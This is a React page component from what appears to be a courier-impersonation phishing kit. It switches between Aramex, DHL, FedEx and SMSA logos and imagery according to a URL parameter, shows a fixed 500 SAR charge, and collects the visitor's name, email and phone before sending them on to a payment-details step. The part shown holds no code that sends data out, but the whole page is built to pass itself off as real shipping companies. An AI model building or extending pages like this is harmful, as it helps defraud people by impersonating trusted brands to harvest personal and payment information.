import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { getServiceBranding } from "@/lib/serviceLogos";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { useLink } from "@/hooks/useSupabase";
import { Shield, ArrowLeft, User, Mail, Phone, CreditCard } from "lucide-react";
import heroAramex from "@/assets/hero-aramex.jpg";
import heroDhl from "@/assets/hero-dhl.jpg";
import heroFedex from "@/assets/hero-fedex.jpg";
import heroSmsa from "@/assets/hero-smsa.jpg";

const PaymentRecipient = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData } = useLink(id);
  const [customerName, setCustomerName] = useState("");
  const [customerEmail, setCustomerEmail] = useState("");
  const [customerPhone, setCustomerPhone] = useState("");
  
  const serviceName = linkData?.payload?.service_name || new URLSearchParams(window.location.search).get('service') || 'aramex';
  const branding = getServiceBranding(serviceName);
  
  const heroImages: Record<string, string> = {
    'aramex': heroAramex,
    'dhl': heroDhl,
    'fedex': heroFedex,
    'smsa': heroSmsa,
  };
  
  const heroImage = heroImages[serviceName.toLowerCase()] || heroAramex;
  
  const handleProceed = (e: React.FormEvent) => {
    e.preventDefault();
    sessionStorage.setItem('customerInfo', JSON.stringify({
      name: customerName,
      email: customerEmail,
      phone: customerPhone,
      service: serviceName
    }));
    navigate(`/pay/${id}/details`);
  };
  
  return (
    <>
      <PaymentMetaTags 
        serviceName={serviceName}
        amount="500 ر.س"
        title={`معلومات المستلم - ${serviceName}`}
        description={`أدخل معلومات المستلم لخدمة ${serviceName}`}
      />
      <div 
        className="min-h-screen bg-background" 
        dir="rtl"
      >
        {/* Hero Section */}
        <div className="relative w-full h-48 sm:h-64 overflow-hidden">
          <img 
            src={heroImage}
            alt={serviceName}
            className="w-full h-full object-cover"
          />
          <div className="absolute inset-0 bg-gradient-to-b from-black/60 via-black/40 to-black/70" />
          
          {/* Logo Overlay */}
          <div className="absolute top-4 left-4 sm:top-6 sm:left-6">
            {branding.logo && (
              <div className="bg-white rounded-2xl p-3 sm:p-4 shadow-lg">
                <img 
                  src={branding.logo} 
                  alt={serviceName}
                  className="h-12 sm:h-16 w-auto"
                  onError={(e) => e.currentTarget.style.display = 'none'}
                />
              </div>
            )}
          </div>
          
          {/* Title Overlay */}
          <div className="absolute bottom-4 right-4 sm:bottom-6 sm:right-6 text-white">
            <div className="text-right">
              <h2 className="text-lg sm:text-2xl font-bold mb-1">{serviceName}</h2>
              <p className="text-xs sm:text-sm opacity-90">خدمة شحن</p>
            </div>
          </div>
        </div>

        <div className="container mx-auto px-3 sm:px-4 -mt-8 sm:-mt-12 relative z-10">
          <div className="max-w-2xl mx-auto">
            
            <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: branding.colors.primary }}>
              <form onSubmit={handleProceed}>
                <div className="flex items-center justify-between mb-6 sm:mb-8">
                  <h1 className="text-xl sm:text-3xl font-bold">معلومات المستلم</h1>
                  
                  <div
                    className="w-14 h-14 sm:w-20 sm:h-20 rounded-2xl flex items-center justify-center shadow-lg"
                    style={{
                      background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
                    }}
                  >
                    <CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />
                  </div>
                </div>

                <div className="space-y-3 sm:space-y-4 mb-6 sm:mb-8">
                  <div>
                    <Label htmlFor="name" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
                      <User className="w-3 h-3 sm:w-4 sm:h-4" />
                      الاسم الكامل
                    </Label>
                    <Input
                      id="name"
                      value={customerName}
                      onChange={(e) => setCustomerName(e.target.value)}
                      required
                      className="h-10 sm:h-12 text-sm sm:text-base"
                      placeholder="أدخل اسمك الكامل"
                    />
                  </div>
                  
                  <div>
                    <Label htmlFor="email" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
                      <Mail className="w-3 h-3 sm:w-4 sm:h-4" />
                      البريد الإلكتروني
                    </Label>
                    <Input
                      id="email"
                      type="email"
                      value={customerEmail}
                      onChange={(e) => setCustomerEmail(e.target.value)}
                      required
                      className="h-10 sm:h-12 text-sm sm:text-base"
                      placeholder="example@email.com"
                    />
                  </div>
                  
                  <div>
                    <Label htmlFor="phone" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
                      <Phone className="w-3 h-3 sm:w-4 sm:h-4" />
                      رقم الهاتف
                    </Label>
                    <Input
                      id="phone"
                      type="tel"
                      value={customerPhone}
                      onChange={(e) => setCustomerPhone(e.target.value)}
                      required
                      className="h-10 sm:h-12 text-sm sm:text-base"
                      placeholder="+966 5X XXX XXXX"
                    />
                  </div>
                </div>
              
                <Button
                  type="submit"
                  size="lg"
                  className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
                  style={{
                    background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
                  }}
                >
                  <span className="ml-2">التالي</span>
                  <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
                </Button>
              
                <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
                  بالمتابعة، أنت توافق على الشروط والأحكام
                </p>
              </form>
            </Card>
          </div>
        </div>
      </div>
    </>
  );
};

export default PaymentRecipient;
